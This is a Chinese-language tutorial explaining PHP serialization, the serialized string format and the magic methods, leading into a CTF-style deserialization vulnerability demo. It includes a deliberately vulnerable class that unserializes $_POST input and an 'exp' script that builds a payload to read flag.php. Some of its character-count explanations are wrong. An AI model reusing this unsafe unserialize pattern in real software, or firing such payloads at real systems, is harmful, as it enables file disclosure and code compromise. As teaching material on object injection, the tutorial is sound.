## 序列化与反序列化

 >序列化：把对象转换为字节序列，用于保存
 >反序列化：把字节序列恢复为对象的过程
 >
 >- 转换成统一的格式，<font style="background:#f9f2f4 ;color:#c7254e  ;padding:0.2em,0.3em">便于传输</font>
 >- 保留对象的状态以及相关的描述信息
 >- 序列化机制的核心作用就是对象状态的保存与重建
 >
 >反序列化本身不是漏洞，但是反序列化的参数可控就有可能导致漏洞

### 0x01 php的序列化与反序列化

**<font size="5px"> serialize()</font>**

> 函数用于序列化数组或对象，并返回一个字符串。

简单来说，序列化就是把东西摆放整齐，比如：

```php
<?php
$sites = array('a', 'bb', 'ccc');
$serialized_data = serialize($sites);
echo  $serialized_data;
?>
```

输出结果为：

```php
a:3:{ i:0;  s:1:"a";	i:1 ; s:2:"bb";		i:2 ; s:3:"ccc"; }
```

```
a - array
b - boolean
d - double
i - integer
o - common object
r - reference
s - string
C - custom object
O - class
N - null
R - pointer reference
U - unicode string
```

a:3	有三个数组
i:0	第一个数组，s:1:"a",表示第一个数组是字符，1表示有两个字符，为"a"
i:1	第二个数组，s:2:"bb",表示第二个数组是字符，2表示有三个字符，为"bb"
i:2	第三个数组，s:3:"ccc",表示第三个数组是字符，3表示有三个字符，为"ccc"

放入对象也是类似的。

```php
<?php
class name {
    var $test1;
    var $test2;
}
$test3 = new name;
$test3->test1 = 'hello';
$test3->test2 = '_world';
echo serialize($test3); 
```

输出结果：

```php
O:4:"name"	:2	:{ s:5:"test1";		s:5:"hello";	s:5:"test2";	s:6:"_world";}
```

 O:4:"name"  指Object(对象) 4个字符:name
 :2  对象属性个数为2
 {}  中为属性字符数：属性值 

**<font size="5px">unserialize()</font>**

比如：

```php
<?php
$sites = array('a', 'bb', 'ccc');
$serialized_data = serialize($sites);
$unserialized_data = unserialize($serialized_data);
print_r($unserialized_data);
?>
```

输出结果：

```php
Array
(
    [0] =>  a
    [1] =>  bb
    [2] =>  ccc
)
```

这就是 PHP 的反序列化，返回原始的结构。

### 0x02 反序列化漏洞

反序列化漏洞相关的，危险的 PHP 魔法函数，两个下划线开头。

```text
__construct():当一个类被创建时自动调用
__destruct():当一个类被销毁时自动调用
__tostring():当把一个类当作字符串使用时自动调用
__wakeup():当调用unserialize()函数时自动调用
__sleep():当调用serialize()函数时自动调用
__get():当获得一个类的成员变量时自动调用
__set():当设置一个类的成员变量时自动调用
__invoke():当把一个类当作函数使用时自动调用
__call():当要调用的方法不存在或权限不足时自动调用
```

**<font size="5px">看一个简单的例子</font>**

unserialize() 反序列化之后，会自动调用__ wakeup() ,因此最理想的情况就是一些漏洞/危害代码在 __wakeup()  中，从而当我们控制序列化字符串时可以去直接触发它们。

```php
<?php
// flag is in flag.php
class popdemo
{
    private $filename = 'demo.php';
    public function __wakeup()
    {
        // TODO: Implement __wakeup() method.
        $this->show($this->filename);
    }
    public function show($filename)
    {
        show_source($filename);
    }
}

unserialize($_POST['a']);//调用__wakeup()
```

exp:

```php
<?php
class popdemo
{
	private $filename = "flag.php";
}
$p = new popdemo();
var_dump(urlencode(serialize($p)));
```

